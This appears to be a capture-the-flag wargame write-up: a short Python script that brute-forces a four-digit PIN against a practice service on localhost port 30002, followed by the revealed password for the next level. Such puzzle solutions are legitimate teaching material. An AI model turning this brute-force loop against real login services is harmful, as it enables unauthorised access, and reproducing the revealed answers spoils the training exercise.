Wrote a small python script:
```
#! /usr/bin/python3

import socket

ITERATIONS=10000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 30002))

print(s.recv(4096))

for i in range(ITERATIONS):
    msg = f'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar {i:04d}\n'
    s.send(msg.encode())
    resp = s.recv(4096).decode().rstrip()
    print(f'{i:04d} {resp}')
    if not resp.startswith('Wrong!'):
        break

s.close()
```

Password for level 25 is `p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d`.
